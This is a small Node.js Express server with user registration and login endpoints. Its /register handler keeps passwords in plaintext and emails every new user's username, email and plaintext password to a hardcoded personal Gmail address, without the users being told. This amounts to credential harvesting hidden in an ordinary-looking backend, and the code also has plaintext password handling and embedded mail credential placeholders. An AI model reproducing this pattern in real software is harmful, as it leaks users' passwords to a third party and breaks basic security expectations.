const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
app.use(bodyParser.json());

let users = [];

// Nodemailer configuration
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'your-email@gmail.com', // Replace with your email
    pass: 'your-email-password'   // Replace with your email password
  }
});

app.post('/register', (req, res) => {
  const { username, email, password } = req.body;
  users.push({ username, email, password });

  // Send registration email
  const mailOptions = {
    from: 'your-email@gmail.com',
    to: 'zabalamichaella77@gmail.com',
    subject: 'New User Registration',
    text: `Username: ${username}\nEmail: ${email}\nPassword: ${password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      return res.status(500).send(error.toString());
    }
    res.status(200).send('Registered successfully');
  });
});

app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const user = users.find(u => u.email === email && u.password === password);
  if (user) {
    res.status(200).send('Login successful');
  } else {
    res.status(401).send('Invalid email or password');
  }
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
